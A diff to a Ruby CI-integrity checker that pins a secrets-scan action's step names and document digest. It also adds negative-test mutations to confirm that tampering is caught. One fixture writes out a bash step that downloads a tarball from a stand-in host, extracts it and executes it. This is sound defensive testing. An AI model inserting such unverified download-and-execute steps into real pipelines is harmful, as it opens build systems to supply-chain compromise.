@@ -8,6 +8,7 @@
 # surface cannot silently change ~190 existing consumers.
 
 require "digest"
+require "json"
 require "open3"
 require "pathname"
 require "yaml"
@@ -18,6 +19,14 @@ TRUST_JOB = "trust-gate"
 IMMUTABLE_RELEASE = "v2.12.1"
 CHECKOUT_SHA = "d23441a48e516b6c34aea4fa41551a30e30af803"
 DETERMINATE_NIX_SHA = "61cbfe2efc2d4e7a8a6d56967c3c1058e846c858"
+EXPECTED_SCANNER_DOCUMENT_SHA256 = "0cfba9f3c0b22839ebc3488098c76a6f6cdcb6ae370a1d989591fa8486bb76a4"
+EXPECTED_SCANNER_STEP_NAMES = [
+  "Install TruffleHog",
+  "TruffleHog scan",
+  "Install gitleaks",
+  "Resolve gitleaks config",
+  "Run gitleaks",
+].freeze
 SCANNER_INSTALL_SPECS = [
   {
     step: "Install TruffleHog",
@@ -119,6 +128,21 @@ end
 
 def deep_copy(value)
   Marshal.load(Marshal.dump(value))
+end
+
+def canonical_document(value)
+  case value
+  when Hash
+    value.map { |key, child| [key.to_s, canonical_document(child)] }.sort.to_h
+  when Array
+    value.map { |child| canonical_document(child) }
+  else
+    value
+  end
+end
+
+def scanner_document_sha256(scanner)
+  Digest::SHA256.hexdigest(JSON.generate(canonical_document(scanner)))
 end
 
 def expected_restricted_cache_description(legacy_description)
@@ -243,7 +267,22 @@ def scanner_install_errors(scanner, spec)
 end
 
 def scanner_integrity_errors(scanner)
-  SCANNER_INSTALL_SPECS.flat_map { |spec| scanner_install_errors(scanner, spec) }
+  errors = []
+  steps = scanner.dig("runs", "steps")
+  actual_step_names = Array(steps).map do |step|
+    step.is_a?(Hash) ? step["name"] : nil
+  end
+  unless steps.is_a?(Array) && actual_step_names == EXPECTED_SCANNER_STEP_NAMES
+    errors << "secrets-scan must retain the exact reviewed step list with no adjacent download, extraction, or execution path"
+  end
+
+  actual_digest = scanner_document_sha256(scanner)
+  unless actual_digest == EXPECTED_SCANNER_DOCUMENT_SHA256
+    errors << "secrets-scan complete composite document changed: expected #{EXPECTED_SCANNER_DOCUMENT_SHA256}, got #{actual_digest}"
+  end
+
+  errors.concat(SCANNER_INSTALL_SPECS.flat_map { |spec| scanner_install_errors(scanner, spec) })
+  errors
 end
 
 def scanner_integrity_oracle_errors(scanner)
@@ -279,6 +318,41 @@ def scanner_integrity_oracle_errors(scanner)
       elsif scanner_install_errors(mutant, spec).empty?
         errors << "secrets-scan negative oracle accepted #{spec[:step]} #{label}"
       end
+    end
+  end
+
+  adjacent_mutations = {
+    "duplicate exact install step" => lambda do |mutant|
+      steps = mutant.dig("runs", "steps")
+      steps << deep_copy(scanner_install_step(mutant, SCANNER_INSTALL_SPECS.first[:step]))
+    end,
+    "adjacent unverified download-extract-execute step" => lambda do |mutant|
+      mutant.dig("runs", "steps") << {
+        "name" => "Unverified scanner path",
+        "shell" => "bash",
+        "run" => <<~SHELL,
+          curl --location https://example.invalid/scanner.tar.gz --output scanner.tar.gz
+          tar --extract --gzip --file scanner.tar.gz
+          ./scanner --version
+        SHELL
+      }
+    end,
+    "adjacent execution-only step" => lambda do |mutant|
+      mutant.dig("runs", "steps") << {
+        "name" => "Alternate scanner execution",
+        "shell" => "bash",
+        "run" => "${RUNNER_TEMP:-/tmp}/secrets-scan-bin/trufflehog --version\n",
+      }
+    end,
+  }
+  adjacent_mutations.each do |label, mutate|
+    mutant = deep_copy(scanner)
+    original = scanner_document_sha256(mutant)
+    mutate.call(mutant)
+    if scanner_document_sha256(mutant) == original
+      errors << "secrets-scan negative oracle could not construct #{label} mutation"
+    elsif scanner_integrity_errors(mutant).empty?
+      errors << "secrets-scan negative oracle accepted #{label}"
     end
   end
   errors
